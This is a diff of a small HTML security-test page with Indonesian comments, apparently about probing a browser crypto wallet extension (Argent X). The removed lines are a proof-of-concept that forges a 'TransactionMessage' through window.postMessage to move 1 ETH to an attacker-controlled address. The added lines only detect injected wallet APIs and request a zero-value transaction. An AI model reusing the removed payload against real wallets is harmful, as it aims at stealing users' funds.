@@ -1,35 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit PoC: Extension Message Injection</title>
+    <title>Security Test: Wallet API Interactor</title>
 </head>
 <body>
-    <h1>Security Test Interface</h1>
-    <button id="trigger">Trigger Malicious Transaction</button>
+    <h1>API Interaction Test</h1>
+    <button id="checkApi">Deteksi Wallet API</button>
+    <button id="triggerTx">Coba Panggil Fungsi Transaksi</button>
+    <pre id="log" style="background: #eee; padding: 10px;"></pre>
 
     <script>
-        // Skenario Nyata: Mengambil ID ekstensi dari atribut yang terekspos di DOM
-        // Jika tidak muncul, Anda harus melakukan inspeksi manual di chrome://extensions
-        const targetId = document.getElementById("argent-x-extension")?.getAttribute("data-extension-id");
+        const log = (msg) => document.getElementById('log').innerText += msg + '\n';
 
-        document.getElementById('trigger').addEventListener('click', () => {
-            // Payload mengacu pada MessageType dari 1000163978.png
-            const payload = {
-                type: "TransactionMessage", // Target tipe pesan spesifik
-                extensionId: targetId,
-                params: {
-                    to: "0xYourControlledAddressHere", // Alamat penyerang
-                    amount: "1000000000000000000", // 1 ETH dalam Wei
-                    data: "0x"
-                },
-                timestamp: Date.now()
-            };
-
-            // Mengirim ke target origin spesifik atau wildcard untuk mendeteksi leak
-            // Skenario nyata: Menggunakan postMessage untuk memintas boundary ekstensi
-            window.postMessage(payload, "*"); 
+        // 1. Deteksi apakah ada objek yang disuntikkan oleh dompet
+        document.getElementById('checkApi').addEventListener('click', () => {
+            const detected = [];
+            // Mencoba mendeteksi beberapa objek umum yang disuntikkan dompet
+            if (window.ethereum) detected.push('window.ethereum');
+            if (window.argent) detected.push('window.argent'); // Contoh jika dompet menyuntikkan objek sendiri
             
-            console.log("Payload dikirim ke ekstensi:", payload);
+            log("API Terdeteksi: " + (detected.length > 0 ? detected.join(', ') : "Tidak ditemukan API umum."));
+        });
+
+        // 2. Coba berinteraksi dengan API yang terdeteksi
+        document.getElementById('triggerTx').addEventListener('click', async () => {
+            if (window.ethereum) {
+                try {
+                    log("Mencoba meminta akses akun...");
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    log("Akun ditemukan: " + accounts[0]);
+                    
+                    log("Mencoba mengirim transaksi (Simulasi)...");
+                    await window.ethereum.request({
+                        method: 'eth_sendTransaction',
+                        params: [{
+                            from: accounts[0],
+                            to: '0x0000000000000000000000000000000000000000',
+                            value: '0x0',
+                        }],
+                    });
+                } catch (e) {
+                    log("Error: " + e.message);
+                }
+            } else {
+                log("API tidak ditemukan, tidak bisa memicu transaksi.");
+            }
         });
     </script>
 </body>
